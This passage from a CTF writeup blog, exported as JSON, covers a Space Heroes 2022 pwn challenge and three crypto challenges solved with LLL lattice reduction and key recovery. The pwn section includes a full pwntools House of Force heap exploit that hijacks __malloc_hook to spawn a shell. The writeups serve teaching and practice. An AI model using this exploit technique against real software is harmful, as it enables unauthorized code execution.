sym.imp.printf ; int printf(const char *format) ‚îÇ ‚îÇ‚ïé‚îÇ 0x004009dc 488b45e0 mov rax, qword [var_20h] ‚îÇ ‚îÇ‚ïé‚îÇ 0x004009e0 4889c7 mov rdi, rax ‚îÇ ‚îÇ‚ïé‚îÇ 0x004009e3 e8b8fdffff call sym.imp.malloc ; void *malloc(size_t size) We can see that the program calls malloc(), using the amount of midi-chlorians as the chunk size. Anything we input to the \u0026ldquo;What do you feel?\u0026rdquo; question will then be written to the heap memory chunk.\nBased on the challenge name, we can pretty much guess that this challenge is a House of Force heap exploitation challenge. This exploitation techniques works by writing more data to the heap more than the chunk size that we requested, which overwrites the size field of the top chunk of the heap, allowing us to do arbitrary write and even code execution.\nBecause this is just a standard / base-case of the House of Force technique, I\u0026rsquo;ll cut the explanation and go straight for the exploitation. If you are interested about the exploitation, feel free to read the resource below:\nhttps://mohamed-fakroud.gitbook.io/red-teamings-dojo/binary-exploitation/heap-house-of-force # exploit.py from pwn import * elf = context.binary = ELF(\u0026#34;./force\u0026#34;) libc = ELF(\u0026#34;./.glibc/glibc_2.28_no-tcache/libc-2.28.so\u0026#34;) io = process(elf.path) context.log_level = \u0026#39;debug\u0026#39; def malloc(size, data): io.sendlineafter(b\u0026#34;(2) Surrender\\n\u0026#34;, b\u0026#34;1\u0026#34;) io.sendlineafter(b\u0026#34;How many midi-chlorians?: \u0026#34;, str(size).encode()) io.sendlineafter(b\u0026#34;What do you feel?: \u0026#34;, data) io.recvuntil(b\u0026#34;You feel a system at \u0026#34;) libc.address = int(io.recvline().decode(), 16) - libc.sym[\u0026#34;system\u0026#34;] io.recvuntil(b\u0026#34;You feel something else at \u0026#34;) heap_addr = int(io.recvline().decode(), 16) print(f\u0026#34;Libc address: {hex(libc.address)}\u0026#34;) malloc(24, b\u0026#34;/bin/sh\\x00\u0026#34; + b\u0026#34;A\u0026#34;*16 + p64(0xffffffffffffffff)) malloc((libc.sym[\u0026#34;__malloc_hook\u0026#34;] - 0x20) - (heap_addr + 0x20), b\u0026#34;A\u0026#34;) malloc(24, p64(libc.sym[\u0026#34;system\u0026#34;])) # malloc(str(heap_addr + 0x10).encode(), b\u0026#34;A\u0026#34;) malloc(next(libc.search(b\u0026#34;/bin/sh\u0026#34;)), b\u0026#34;\u0026#34;) # Honestly more reliable io.interactive() Link, resources:\nhttps://github.com/knittingirl/CTF-Writeups/tree/main/pwn_challs/space_heroes_22/Use%20the%20Force%2C%20Luke https://mohamed-fakroud.gitbook.io/red-teamings-dojo/binary-exploitation/heap-house-of-force ","date":"15 January 2025","externalUrl":null,"permalink":"/ctf/spaceheroesctf2022/usetheforceluke/","section":"CTF Writeups","summary":"Space Heroes CTF 2022. House of Force heap exploitation.","title":"Pwn: Use the Force, Luke","type":"ctf"},{"content":" Challenge # Yesterday I stumbled upon a CTF challenge that is about solving a knapsack problem, which is very new to me. After doing that challenge, I am curious and wanted to do more of knapsack problem related challenges in order to learn more about knapsack and the application of LLL to solve the problem, and I found this challenge from Backdoor CTF 2023.\nThere are several writeups that I found:\nMeet in The Middle: https://ctftime.org/writeup/38372 https://meashiri.github.io/ctf-writeups/posts/202312-backdoorctf/#knapsack Lattice reduction with LLL: https://connor-mccartney.github.io/cryptography/other/BackdoorCTF-2023-writeups Lattice reduction with BKZ: https://github.com/tde-nico/backdoor_ctf_2023/blob/main/crypto/knapsack/solve.sage However in this writeup, we will focus on the writeup that uses lattice reduction methods (especially LLL) since I am trying to learn about it, which is the writeup by ConnorM.\nWe are provided script.py and output.txt.\n# script.py import random import hashlib from Crypto.Util.number import bytes_to_long from Crypto.Cipher import AES flag = b\u0026#34;The flag has been REDACTED\u0026#34; secret = b\u0026#34;The seccret has been REDACTED\u0026#34; key = hashlib.sha256(secret).digest()[:16] cipher = AES.new(key, AES.MODE_ECB) padded_flag = flag + b\u0026#39;\\x00\u0026#39;*(-len(flag)%16) ciphertext = cipher.encrypt(padded_flag) f = open(\u0026#39;output.txt\u0026#39;,\u0026#39;w\u0026#39;) f.write(f\u0026#34;Ciphertext: {ciphertext.hex()}\\n\\n\u0026#34;) arr = [ random.randint(1,1000000000000) for i in range(40) ] k = bytes_to_long(secret) s = 0 for i in range(40): if k\u0026amp;(1\u0026lt;\u0026lt;i): s+=arr[i] f.write(f\u0026#39;numbers: {str(arr)[1:-1]}\\nsum: {s}\\n\u0026#39;) f.close() # output.txt (?) Ciphertext: af95a58f4fbab33cd98f2bfcdcd19a101c04232ac6e8f7e9b705b942be9707b66ac0e62ed38f14046d1cd86b133ebda9 numbers: 600848253359, 617370603129, 506919465064, 218995773533, 831016169202, 501743312177, 15915022145, 902217876313, 16106924577, 339484425400, 372255158657, 612977795139, 755932592051, 188931588244, 266379866558, 661628157071, 428027838199, 929094803770, 917715204448, 103431741147, 549163664804, 398306592361, 442876575930, 641158284784, 492384131229, 524027495955, 232203211652, 213223394430, 322608432478, 721091079509, 518513918024, 397397503488, 62846154328, 725196249396, 443022485079, 547194537747, 348150826751, 522851553238, 421636467374, 12712949979 sum: 7929089016814 The flag is AES encrypted with a secret key, and we are only given some numbers related to the secret key to recover the secret key from. The numbers are generated by first getting 40 random numbers. These numbers will then be added to a sum variable s depending on the current bit of k (0 or 1). Since we have the numbers array arr and the sum variable s and we have to recover the bits of k, this becomes a classic subset-sum problem / knapsack problem (general knapsack).\nTesting LLL # I\u0026rsquo;ve been reading some other writeups and found that subset-sum problem can be solved with LLL. For this particular problem however, I only found this writeup by ConnorM which actually uses LLL to solve the problem. The writeup has a good explanation and steps on creating the initial matrix for LLL reduction, so let\u0026rsquo;s walk through the process. Feel free to skip to the Solution for the solve.\nLet\u0026rsquo;s first start by arranging the problem as an equation:\n$$sum = arr_0 . b_0 + arr_1 . b_1 + arr_2 . b_2 + \\ldots + arr_i . b_i$$\nwith all \\(bi\\) value being either 0 or 1.\nWe can transform this equation in form of vectors:\n$$ b_0 \\begin{bmatrix} \\text{arr}_0 \\\\ 0 \\\\ 0 \\\\ 0 \\\\ 1 \\end{bmatrix} + b_1 \\begin{bmatrix} \\text{arr}_1 \\\\ 0 \\\\ 0 \\\\ 1 \\\\ 0 \\end{bmatrix} + b_2 \\begin{bmatrix} \\text{arr}_2 \\\\ 0 \\\\ 1 \\\\ 0 \\\\ 0 \\end{bmatrix} + b_3 \\begin{bmatrix} \\text{arr}_3 \\\\ 1 \\\\ 0 \\\\ 0 \\\\ 0 \\end{bmatrix} + 1 \\begin{bmatrix} -s \\\\ 0 \\\\ 0 \\\\ 0 \\\\ 0 \\end{bmatrix} = \\begin{bmatrix} 0 \\\\ b_3 \\\\ b_2 \\\\ b_1 \\\\ b_0 \\end{bmatrix} $$\nThese vectors form the lattice basis vectors for us to use in matrix M.\n$$ M = \\begin{bmatrix}1 \u0026amp; 0 \u0026amp; 0 \u0026amp; 0 \u0026amp; arr_0 \\\\ 0 \u0026amp; 1 \u0026amp; 0 \u0026amp; 0 \u0026amp; arr_1 \\\\ 0 \u0026amp; 0 \u0026amp; 1 \u0026amp; 0 \u0026amp; arr_2 \\\\ 0 \u0026amp; 0 \u0026amp; 0 \u0026amp; 1 \u0026amp; arr_3 \\\\ 0 \u0026amp; 0 \u0026amp; 0 \u0026amp; 0 \u0026amp; -s\\end{bmatrix} $$\nWhen we apply LLL to this matrix \\(M\\), our target is to have one of the rows of the resulting matrix to be the vector on the right hand-side of the equation. Let\u0026rsquo;s give it a try using Sagemath.\narr = [600848253359, 617370603129, 506919465064, 218995773533, 831016169202, 501743312177, 15915022145, 902217876313, 16106924577, 339484425400, 372255158657, 612977795139, 755932592051, 188931588244, 266379866558, 661628157071, 428027838199, 929094803770, 917715204448, 103431741147, 549163664804, 398306592361, 442876575930, 641158284784, 492384131229, 524027495955, 232203211652, 213223394430, 322608432478, 721091079509, 518513918024, 397397503488, 62846154328, 725196249396, 443022485079, 547194537747, 348150826751, 522851553238, 421636467374, 12712949979] s = 7929089016814 n = len(arr) M = Matrix(ZZ, n+1, n+1) for i in range(n): M[i, i] = 1 M[i, -1] = arr[i] M[-1, -1] = -s Mr = M.LLL() print(Mr) We can see that we successfully applied LLL and reduced the basis vectors into smaller ones, but if we check the result, none of them consists of only two numbers representing the bits, so we don\u0026rsquo;t have our correct result yet.\nWe can improve the basis vectors by including guesses for the value of \\(b_i\\). The value of \\(b_i\\) can either be 0 or 1, so we can take the average, being 1/2. This also means that our target vector needs to be added with 1/2 to get the actual value of \\(b_i\\).\n$$ b_0 \\begin{bmatrix} \\text{arr}_0 \\\\ 0 \\\\ 0 \\\\ 0 \\\\ 1 \\end{bmatrix} + b_1 \\begin{bmatrix} \\text{arr}_1 \\\\ 0 \\\\ 0 \\\\ 1 \\\\ 0 \\end{bmatrix} + b_2 \\begin{bmatrix} \\text{arr}_2 \\\\ 0 \\\\ 1 \\\\ 0 \\\\ 0 \\end{bmatrix} + b_3 \\begin{bmatrix} \\text{arr}_3 \\\\ 1 \\\\ 0 \\\\ 0 \\\\ 0 \\end{bmatrix} + 1 \\begin{bmatrix} -s \\\\ -1/2 \\\\ -1/2 \\\\ -1/2 \\\\ -1/2 \\end{bmatrix} = \\begin{bmatrix} 0 \\\\ b_3 -1/2 \\\\ b_2 -1/2 \\\\ b_1 -1/2 \\\\ b_0 -1/2 \\end{bmatrix} $$\n$$ M = \\begin{bmatrix}1 \u0026amp; 0 \u0026amp; 0 \u0026amp; 0 \u0026amp; arr_0 \\\\ 0 \u0026amp; 1 \u0026amp; 0 \u0026amp; 0 \u0026amp; arr_1 \\\\ 0 \u0026amp; 0 \u0026amp; 1 \u0026amp; 0 \u0026amp; arr_2 \\\\ 0 \u0026amp; 0 \u0026amp; 0 \u0026amp; 1 \u0026amp; arr_3 \\\\ -1/2 \u0026amp; -1/2 \u0026amp; -1/2 \u0026amp; -1/2 \u0026amp; -s\\end{bmatrix} $$\nWe can also improve the lattice by scaling each first component of the basis vectors by \\(N\\) for \\(N = \\operatorname{ceil}({\\frac{\\sqrt{length}}{2}})\\). This won\u0026rsquo;t affect the resulting vector on the RHS. If we test it with the function above, we can see that this yield better results too.\n$$ b_0 \\begin{bmatrix} N.arr_0 \\\\ 0 \\\\ 0 \\\\ 0 \\\\ 1 \\end{bmatrix} + b_1 \\begin{bmatrix} N.arr_1 \\\\ 0 \\\\ 0 \\\\ 1 \\\\ 0 \\end{bmatrix} + b_2 \\begin{bmatrix} N.arr_2 \\\\ 0 \\\\ 1 \\\\ 0 \\\\ 0 \\end{bmatrix} + b_3 \\begin{bmatrix} N.arr_3 \\\\ 1 \\\\ 0 \\\\ 0 \\\\ 0 \\end{bmatrix} + 1 \\begin{bmatrix} -N.s \\\\ -1/2 \\\\ -1/2 \\\\ -1/2 \\\\ -1/2 \\end{bmatrix} = \\begin{bmatrix} 0 \\\\ b_3 -1/2 \\\\ b_2 -1/2 \\\\ b_1 -1/2 \\\\ b_0 -1/2 \\end{bmatrix} $$\n$$ M = \\begin{bmatrix}1 \u0026amp; 0 \u0026amp; 0 \u0026amp; 0 \u0026amp; N.arr_0 \\\\ 0 \u0026amp; 1 \u0026amp; 0 \u0026amp; 0 \u0026amp; N.arr_1 \\\\ 0 \u0026amp; 0 \u0026amp; 1 \u0026amp; 0 \u0026amp; N.arr_2 \\\\ 0 \u0026amp; 0 \u0026amp; 0 \u0026amp; 1 \u0026amp; N.arr_3 \\\\ -1/2 \u0026amp; -1/2 \u0026amp; -1/2 \u0026amp; -1/2 \u0026amp; -N.s\\end{bmatrix} $$\nI modified the script by ConnorM to also test the scaled improved basis, so we will be testing three basis vectors performance when we do LLL on it:\nfrom random import randint def previous_basis(length): arr = [ randint(1,1000000000000) for _ in range(length) ] s = sum([i for i in arr if randint(0, 1) == 0]) M = identity_matrix(len(arr)) M = M.augment(vector(arr)) M = M.stack(vector([0 for _ in range(len(arr))] + [-s])) for row in M.LLL(): for row in (row, -row): if row[-1] == 0: subset = [arr[i] for i, x in enumerate(row[:-1]) if x==1] if sum(subset) == s: return True return False def improved_basis(length): arr = [ randint(1,1000000000000) for _ in range(length) ] s = sum([i for i in arr if randint(0, 1) == 0]) M = identity_matrix(QQ, len(arr)) M = M.augment(vector(arr)) M = M.stack(vector([-1/2 for _ in range(len(arr))] + [-s])) for row in M.LLL(): for row in (row, -row): if row[-1] == 0: subset = [arr[i] for i, x in enumerate(row[:-1]) if x+1/2==1] if sum(subset) == s: return True return False def improved_basis_2(length): arr = [ randint(1,1000000000000) for _ in range(length) ] s = sum([i for i in arr if randint(0, 1) == 0]) n = len(arr) N = ceil(sqrt(n) / 2) M = Matrix(QQ, n + 1, n + 1) for i in range(n): M[i, i] = 1 M[i, -1] = N * arr[i] M[-1, i] = -1/2 M[-1, -1] = -N * s for row in M.LLL(): for row in (row, -row): if row[-1] == 0: subset = [arr[i] for i, x in enumerate(row[:-1]) if x+1/2==1] if sum(subset) == s: return True return False def test(f, length): n = 100 count = 0 for _ in range(n): if f(length): count += 1 return f\u0026#39;{float(count/n):.2%}\u0026#39; for length in range(10, 45): print(f\u0026#34;{length = }:\u0026#34;) print(\u0026#34;prev\u0026#34;, test(previous_basis, length)) print(\u0026#34;impr\u0026#34;, test(improved_basis, length)) print(\u0026#34;impr2\u0026#34;, test(improved_basis_2, length)) print() And here\u0026rsquo;s the result of testing the three vector basis:\nLength Prev (%) Impr (%) Impr2 (%) 10 100.00 100.00 100.00 11 100.00 100.00 100.00 12 100.00 100.00 100.00 13 100.00 100.00 100.00 14 100.00 100.00 100.00 15 100.00 100.00 100.00 16 100.00 100.00 100.00 17 100.00 100.00 100.00 18 100.00 100.00 100.00 19 100.00 100.00 100.00 20 100.00 100.00 100.00 21 100.00 100.00 100.00 22 97.00 100.00 100.00 23 95.00 100.00 100.00 24 87.00 100.00 100.00 25 84.00 100.00 100.00 26 63.00 100.00 100.00 27 43.00 100.00 100.00 28 47.00 100.00 100.00 29 32.00 98.00 96.00 30 24.00 97.00 99.00 31 29.00 85.00 94.00 32 7.00 81.00 87.00 33 5.00 64.00 73.00 34 5.00 51.00 65.00 35 3.00 39.00 60.00 36 2.00 36.00 46.00 37 1.00 14.00 27.00 38 0.00 15.00 26.00 39 1.00 6.00 14.00 40 0.00 2.00 4.00 We can see that the previous (starting) basis has lower accuracy than the improved basis. The second improved basis also has a higher average accuracy than the first improved basis. However, to solve this problem where the basis has the length of 40, this is not enough as we still only have a low chance that it will generate the correct result.\nSolution # The secret number or k can\u0026rsquo;t have all of its bits being 1, so we can attempt to reduce the size of the matrix by brute-forcing the combinations of a smaller subset, like the subset of the array with the size of 39 numbers (one number less). By combining this with the second improved basis, we can get the bits of the secret in one of the resulting vectors. We can then use the bits to reconstruct secret and using it as the decryption key to get the flag.\n# solve.sage from itertools import combinations from Crypto.Util.number import long_to_bytes from Crypto.Cipher import AES from hashlib import sha256 def improved_basis_2(arr, s): n = len(arr) N = ceil(sqrt(n) / 2) M = Matrix(QQ, n + 1, n + 1) for i in range(n): M[i, i] = 1 M[i, -1] = N * arr[i] M[-1, i] = -1/2 M[-1, -1] = -N * s for row in M.LLL(): for row in (row, -row): k = [i + 1/2 for i in row[:-1]] if all([i in (0, 1) for i in k]): subset = [val for val, currbit in zip(arr, k) if currbit == 1] if sum(subset) == s: return subset return False def brute_subsets(arr, s, length): for subset in combinations(arr, length): res = improved_basis_2(subset, s) if res: return res ct = bytes.fromhex(\u0026#34;af95a58f4fbab33cd98f2bfcdcd19a101c04232ac6e8f7e9b705b942be9707b66ac0e62ed38f14046d1cd86b133ebda9\u0026#34;) arr = [600848253359, 617370603129, 506919465064, 218995773533, 831016169202, 501743312177, 15915022145, 902217876313, 16106924577, 339484425400, 372255158657, 612977795139, 755932592051, 188931588244, 266379866558, 661628157071, 428027838199, 929094803770, 917715204448, 103431741147, 549163664804, 398306592361, 442876575930, 641158284784, 492384131229, 524027495955, 232203211652, 213223394430, 322608432478, 721091079509, 518513918024, 397397503488, 62846154328, 725196249396, 443022485079, 547194537747, 348150826751, 522851553238, 421636467374, 12712949979] s = 7929089016814 n = len(arr) ans = brute_subsets(arr, s, len(arr) - 1) secret = long_to_bytes(sum([2**i for i in range(len(arr)) if arr[i] in ans])) key = sha256(secret).digest()[:16] cipher = AES.new(key, AES.MODE_ECB) print(cipher.decrypt(ct)) Flag: flag{N0t_r34dy_f0r_M3rkl3-H3llman}\nLink, resources:\nhttps://connor-mccartney.github.io/cryptography/other/BackdoorCTF-2023-writeups https://github.com/tde-nico/backdoor_ctf_2023/blob/main/crypto/knapsack/solve.sage https://ctf-wiki.mahaloz.re/crypto/asymmetric/knapsack/knapsack/ ","date":"8 January 2025","externalUrl":null,"permalink":"/ctf/backdoorctf2023/knapsack/","section":"CTF Writeups","summary":"Backdoor CTF 2023. Classic subset sum / knapsack problem solved with LLL.","title":"Crypto: Knapsack","type":"ctf"},{"content":"","date":"8 January 2025","externalUrl":null,"permalink":"/tags/knapsack/","section":"Tags","summary":"","title":"Knapsack","type":"tags"},{"content":"","date":"8 January 2025","externalUrl":null,"permalink":"/tags/lll/","section":"Tags","summary":"","title":"LLL","type":"tags"},{"content":"","date":"8 January 2025","externalUrl":null,"permalink":"/tags/matrix/","section":"Tags","summary":"","title":"Matrix","type":"tags"},{"content":"","date":"6 January 2025","externalUrl":null,"permalink":"/tags/classic-cipher/","section":"Tags","summary":"","title":"Classic-Cipher","type":"tags"},{"content":" Challenge # We are provided main.go and some example input output files.\n# main.go package main import ( \u0026#34;crypto/rand\u0026#34; \u0026#34;encoding/hex\u0026#34; \u0026#34;encoding/json\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;math/big\u0026#34; \u0026#34;os\u0026#34; \u0026#34;strings\u0026#34; ) var CharSet = map[rune]string{ \u0026#39;0\u0026#39;: \u0026#34;üê±\u0026#34;, \u0026#39;1\u0026#39;: \u0026#34;üêà\u0026#34;, \u0026#39;2\u0026#39;: \u0026#34;üò∏\u0026#34;, \u0026#39;3\u0026#39;: \u0026#34;üòπ\u0026#34;, \u0026#39;4\u0026#39;: \u0026#34;üò∫\u0026#34;, \u0026#39;5\u0026#39;: \u0026#34;üòª\u0026#34;, \u0026#39;6\u0026#39;: \u0026#34;üòº\u0026#34;, \u0026#39;7\u0026#39;: \u0026#34;üòΩ\u0026#34;, \u0026#39;8\u0026#39;: \u0026#34;üòæ\u0026#34;, \u0026#39;9\u0026#39;: \u0026#34;üòø\u0026#34;, \u0026#39;A\u0026#39;: \u0026#34;üôÄ\u0026#34;, \u0026#39;B\u0026#39;: \u0026#34;üê±‚Äçüë§\u0026#34;, \u0026#39;C\u0026#39;: \u0026#34;üê±‚Äçüèç\u0026#34;, \u0026#39;D\u0026#39;: \u0026#34;üê±‚Äçüíª\u0026#34;, \u0026#39;E\u0026#39;: \u0026#34;üê±‚Äçüëì\u0026#34;, \u0026#39;F\u0026#39;: \u0026#34;üê±‚ÄçüöÄ\u0026#34;, } func catify(input string, keys []int) string { var keyedText string var result string for i, char := range input { keyedText += string(rune(int(char) + keys[i])) } fmt.Printf(\u0026#34;I2Keyed: %s\\n\u0026#34;, keyedText) hexEncoded := strings.ToUpper(hex.EncodeToString([]byte(keyedText))) fmt.Printf(\u0026#34;K2Hex: %s\\n\u0026#34;, hexEncoded) for _, rune := range hexEncoded { result += CharSet[rune] } return result } func savePair(name, input, output string) { inputFile, err := os.OpenFile(name+\u0026#34;_input.txt\u0026#34;, os.O_RDWR|os.O_CREATE|os.O_TRUNC, 0644) if err != nil { fmt.Println(err) return } defer inputFile.Close() outputFile, err := os.OpenFile(name+\u0026#34;_output.txt\u0026#34;, os.O_RDWR|os.O_CREATE|os.O_TRUNC, 0644) if err != nil { fmt.Println(err) return } defer outputFile.Close() if _, err := inputFile.Write([]byte(input)); err != nil { fmt.Println(err) return } if _, err := outputFile.Write([]byte(output)); err != nil { fmt.Println(err) return } } func getKeys(length int) []int { var keys = []int{} keyFileName := fmt.Sprintf(\u0026#34;keys_%d.json\u0026#34;, length) file, err := os.Open(keyFileName) if err != nil { for i := 0; i \u0026lt; length; i++ { num, _ := rand.Int(rand.Reader, big.NewInt(60000)) keys = append(keys, int(num.Int64())) } keyFile, err := os.OpenFile(keyFileName, os.O_RDWR|os.O_CREATE|os.O_TRUNC, 0644) if err != nil { fmt.Println(err) return []int{} } defer keyFile.Close() encoded, _ := json.Marshal(keys) keyFile.Write(encoded) return keys } json.NewDecoder(file).Decode(\u0026amp;keys) return keys } func main() { input := \u0026#34;You fools! You will never get my catnip!!!!!!!\u0026#34; keys := getKeys(len(input)) encoded := catify(input, keys) savePair(\u0026#34;example\u0026#34;, input, encoded) } The encryption starts by getting the encryption keys from the getKeys() function, which are stored in keys variable. The getKeys() function starts with generating length random numbers ranging from 0 - 59999, which are then stored in the key file. The encryption works by adding the ord() of the current character of the message with the current key, then convert them to hex. The hex representation is then converted to the cat emojis based on their value.\nSolution # Since we are given an example input and output, we can just get the encryption key value by subtracting the ASCII value of the output by the ASCII value of the input. We can then use the encryption key to decrypt the flag.\n# solve.py charset = { \u0026#39;0\u0026#39;: \u0026#34;üê±\u0026#34;, \u0026#39;1\u0026#39;: \u0026#34;üêà\u0026#34;, \u0026#39;2\u0026#39;: \u0026#34;üò∏\u0026#34;, \u0026#39;3\u0026#39;: \u0026#34;üòπ\u0026#34;, \u0026#39;4\u0026#39;: \u0026#34;üò∫\u0026#34;, \u0026#39;5\u0026#39;: \u0026#34;üòª\u0026#34;, \u0026#39;6\u0026#39;: \u0026#34;üòº\u0026#34;, \u0026#39;7\u0026#39;: \u0026#34;üòΩ\u0026#34;, \u0026#39;8\u0026#39;: \u0026#34;üòæ\u0026#34;, \u0026#39;9\u0026#39;: \u0026#34;üòø\u0026#34;, \u0026#39;A\u0026#39;: \u0026#34;üôÄ\u0026#34;, \u0026#39;B\u0026#39;: \u0026#34;üê±‚Äçüë§\u0026#34;, \u0026#39;C\u0026#39;: \u0026#34;üê±‚Äçüèç\u0026#34;, \u0026#39;D\u0026#39;: \u0026#34;üê±‚Äçüíª\u0026#34;, \u0026#39;E\u0026#39;: \u0026#34;üê±‚Äçüëì\u0026#34;, \u0026#39;F\u0026#39;: \u0026#34;üê±‚ÄçüöÄ\u0026#34;, } ex_input = open(\u0026#34;example_input.txt\u0026#34;).read() ex_output = open(\u0026#34;example_output.txt\u0026#34;).read() enc_flag = open(\u0026#34;flag_output.txt\u0026#34;).read() for key, item in list(charset.items())[::-1]: ex_output = ex_output.replace(item, key) enc_flag = enc_flag.replace(item, key) ex_output = bytes.fromhex(ex_output).decode(\u0026#34;utf-8\u0026#34;) enc_flag = bytes.fromhex(enc_flag).decode(\u0026#34;utf-8\u0026#34;) key = [ord(ex_out) - ord(ex_in) for ex_in, ex_out in zip(ex_input, ex_output)] flag = [ord(flg_out) - keyb for keyb, flg_out in zip(key, enc_flag)] print(bytes(flag)) Flag: irisctf{s0m371m3s_bY735_4r3n7_wh47_y0u_3xp3c7}\n","date":"6 January 2025","externalUrl":null,"permalink":"/ctf/irisctf2025/kittycrypt/","section":"CTF Writeups","summary":"Iris CTF 2025. Simple character shifted by key.","title":"Crypto: kittycrypt","type":"ctf"},{"content":" Challenge # This challenge is upsolved from the author\u0026rsquo;s writeup. We are provided chal.sage and output.txt.\n# chal.sage import secrets F.\u0026lt;i,j,k\u0026gt; = QuaternionAlgebra(-1, -1) A = [] B = [1, i, j, k] msg_bin = b\u0026#34;irisctf{redacted_redacted_redacted_}\u0026#34; assert len(msg_bin) % 4 == 0 msg = [F(sum(Integer(msg_bin[idx+bi])*b for bi, b in enumerate(B))) for idx in range(0, len(msg_bin), len(B))] targ = 2^64 for _ in range(len(msg)): a = F(sum(secrets.randbelow(targ)*b for b in B)) A.append(a) sm = F(0) for idx in range(len(msg)): sm += msg[idx] * A[idx] print(\u0026#34;A =\u0026#34;, A) print(\u0026#34;s =\u0026#34;, sm) # output.txt A = [17182433425281628234 + 14279655808574179137*i + 8531159707880760053*j + 10324521189909330699*k, 10979190813462137563 + 11958433776450130274*i + 10360430094019091456*j + 11669398524919455091*k, 3230073756301653559 + 4778309388978960703*i + 7991444794442975980*j + 11596790291939515343*k, 11946083696500480600 + 18097491527846518653*i + 5640046632870036155*j + 2308502738741771335*k, 12639949829592355838 + 12578487825594881151*i + 5989294895593982847*j + 9055819202108394307*k, 15962426286361116943 + 6558955524158439283*i + 2284893063407554440*j + 14331331998172190719*k, 14588723113888416852 + 432503514368407804*i + 11024468666631962695*j + 10056344423714511721*k, 2058233428417594677 + 7708470259314925062*i + 7418836888786246673*j + 14461629396829662899*k, 4259431518253064343 + 9872607911298470259*i + 16758451559955816076*j + 16552476455431860146*k] s = -17021892191322790357078 + 19986226329660045481112*i + 15643261273292061217693*j + 21139791497063095405696*k The encryption starts by diving the message into blocks of four characters each, then use their ASCII values as coefficients to form a quaternion, which is a four dimensional vector.\nsage: msg = [F(sum(Integer(msg_bin[idx+bi])*b for bi, b in enumerate(B))) for idx in range(0, len(msg_bin), len(B))] sage: msg [105 + 114*i + 105*j + 115*k, 99 + 116*i + 102*j + 123*k, 114 + 101*i + 100*j + 97*k, 99 + 116*i + 101*j + 100*k, 95 + 114*i + 101*j + 100*k, 97 + 99*i + 116*j + 101*k, 100 + 95*i + 114*j + 101*k, 100 + 97*i + 99*j + 116*k, 101 + 100*i + 95*j + 125*k] It will then generate a list of quaternions with the same size as the msg quaternions above. The coefficients for the quaternions are randomly generated 64 bit integers.\nsage: for _ in range(len(msg)): ....: a = F(sum(secrets.randbelow(targ)*b for b in B)) ....: A.append(a) ....: sage: A [13837388767782043972 + 7809201807996912089*i + 12986947397704081026*j + 609619010023959748*k, 8771729123148867804 + 18103239779347531290*i + 6575900090027619404*j + 18328038587554093584*k, 977244651506020571 + 12569942643005573095*i + 6978627459516744464*j + 6479286072282315114*k, 12411012500437879663 + 2135025104182005264*i + 5425268026679454877*j + 702427975534281031*k, 17100667416476938058 + 1808064680619569426*i + 7772845331222421881*j + 4476043718848060056*k, 3814478570682782772 + 14090353431496533110*i + 2084415528130555435*j + 6783308246110605206*k, 3715153897463101027 + 6448272151618476822*i + 15602473372192830651*j + 12939978103417235880*k, 14634677867118958438 + 13682483499628209437*i + 2144135849019529928*j + 12058704514056147705*k, 14930035260794662679 + 6646560134513752972*i + 6487028501149968035*j + 10209325974838223425*k] It will then combine A and msg by multiplying the elements together. Each element of A and msg are quaternions, so the quaternion multiplication rule applies as shown below.\nq1 = a1 + b1*i + c1*j + d1*k q2 = a2 + b2*i + c2*j + d2*k x = a1*‚Äãa2‚Äã ‚àí b1*‚Äãb2 ‚Äã‚àí c1*‚Äãc2‚Äã ‚àí d1*‚Äãd2 y = a1*‚Äãb2 ‚Äã+ b1*‚Äãa2 ‚Äã+ c1*‚Äãd2 ‚Äã‚àí d1*‚Äãc2 z = a1*‚Äãc2 ‚Äã‚àí b1*‚Äãd2 ‚Äã+ c1*‚Äãa2 ‚Äã+ d1*‚Äãb2 w = a1*‚Äãd2 ‚Äã+ b1*‚Äãc2 ‚Äã‚àí c1*‚Äãb2 ‚Äã+ d1*‚Äãa2 q1*q2 = x + y*i + z*j + w*k‚Äã‚Äã‚Äã After all of the quaternions of A and msg are multiplied together, they are all summed into a single quaternion sm which is the result. Now we have to recover the value of msg given A and sm.\nSolution # If we pay a close attention, then we will notice that this is a Knapsack problem, as we are given a list of quaternions (general knapsack) A and the sum sm. The Knapsack problem can be solved using LLL, so let\u0026rsquo;s construct the matrix first. Here\u0026rsquo;s how we can build the matrix M to use for the LLL based on this paper.\nSome elements in matrix M here is still in form of quaternions, so we will have to convert them to into another matrix with elements in the complex field, followed by another conversion to another matrix with elements over the integers. Only then we can use LLL to the resulting matrix.\n# Representation of a quaternion a + bi + cj + dk as matrix over Z [ a -b c -d] [ b a d c] [-c -d a b] [ d -c -b a] The output matrix of the LLL algorithm has to be sliced per blocks (per 4 elements) because it is formed from the quaternion 1, i, j, k. We will then filter for valid results where the coefficients are valid ASCII values between 0 and 128, then check each valid results if they are the flag. Here\u0026rsquo;s the full solve script.\nF.\u0026lt;i,j,k\u0026gt; = QuaternionAlgebra(-1, -1) load(\u0026#34;output.sage\u0026#34;) # output.txt A = [F(a) for a in A] sm = F(s) n = len(A) N = F(1024) # scaling # Create matrix M M = Matrix(F, n+1, n+1) for i in range(n): M[i, i] = 1 M[i, n] = N * A[i] M[n, n] = N * sm # Convert quaternion matrix to complex numbers (Z[i]) matrix def quaterToComplexMatrix(M): rows = [] for row in M: nr = [e[0]+e[1]*I for e in row] + [e[2]+e[3]*I for e in row] rows.append(nr) for row in M: nr = [-e[2]+e[3]*I for e in row] + [e[0]-e[1]*I for e in row] rows.append(nr) return matrix(ZZ[I], rows) # Convert complex numbers matrix to matrix over the integers def complexToRealMatrix(M): rows = [] for row in M: nr = [e.real() for e in row] + [-e.imag() for e in row] rows.append(nr) for row in M: nr = [e.imag() for e in row] + [e.real() for e in row] rows.append(nr) return matrix(ZZ, rows) Mc = quaterToComplexMatrix(M) Mr = complexToRealMatrix(Mc) M_reduced = Mr.LLL() # Extract possible results (blocks) for the resulting matrix possible_res = set() for row in M_reduced: nl = len(row) // 4 for ni in range(4): if all(int(x) \u0026gt; 0 and int(x) \u0026lt; 128 for x in row[ni*nl:ni*nl+nl-1]): possible_res.add(bytes([int(x) for x in row[ni*nl:ni*nl+nl-1]])) if all(int(-x) \u0026gt; 0 and int(-x) \u0026lt; 128 for x in row[ni*nl:ni*nl+nl-1]): possible_res.add(bytes([int(-x) for x in row[ni*nl:ni*nl+nl-1]])) print(possible_res) import itertools # Test result for all ordering of the possible_res blocks for per in itertools.permutations(possible_res, int(4)): curr = b\u0026#34;\u0026#34;.join(bytes([per[nj][ni] for nj in range(4)]) for ni in range(len(per[0]))) if 